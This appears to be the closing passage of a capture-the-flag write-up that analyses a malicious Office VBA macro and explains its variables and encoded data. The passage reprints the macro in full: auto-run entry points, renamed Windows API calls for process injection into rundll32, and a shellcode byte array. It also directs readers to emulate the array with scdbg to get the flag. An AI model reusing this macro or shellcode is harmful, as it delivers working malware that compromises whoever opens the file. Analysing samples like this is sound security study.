    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,-61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127,-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116,-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8,-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119,-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123,-80,-4,-128,-43,27,-96,36,-99,-79,-75,84,-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50,-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102,-116,-15,-124,-37,110,-109,-112,-117,-26,97,-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31,-105,-98,-92,60,-46,-95,47,-76,34,111,-40,-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47,-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85,-113,-75,-75,6,-86,-71,99,59,103,44,-116,109,-37,-25,-28,-109,2,-49,-86,108,97,83,-84,-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11,-110,122,-110,-6,82,-126,57,83,-6,9,-84,17,-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116,-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```

In the provided VBA code, `rwxpage` is a variable used to store the address of the memory page that will be allocated in the target process (`rundll32.exe`) using the `AllocStuff` function. The name `rwxpage` appears to suggest that the memory page will be set with read, write, and execute permissions.

The data in the `myArray` is a set of integer values that have been encoded as decimal numbers using a simple encoding technique, likely to obfuscate the real purpose of the data.

```
Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,-61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127,-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116,-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8,-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119,-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123,-80,-4,-128,-43,27,-96,36,-99,-79,-75,84,-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50,-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102,-116,-15,-124,-37,110,-109,-112,-117,-26,97,-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31,-105,-98,-92,60,-46,-95,47,-76,34,111,-40,-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47,-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85,-113,-75,-75,6,-86,-71,99,59,103,44,-116,109,-37,-25,-28,-109,2,-49,-86,108,97,83,-84,-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11,-110,122,-110,-6,82,-126,57,83,-6,9,-84,17,-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116,-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78)
```

Write it to a file and run it by using scdbg => flag

That’s it! Now you can do this by yourself and get the victory flag. Thank you for taking time reading this. See you soon in the next post!
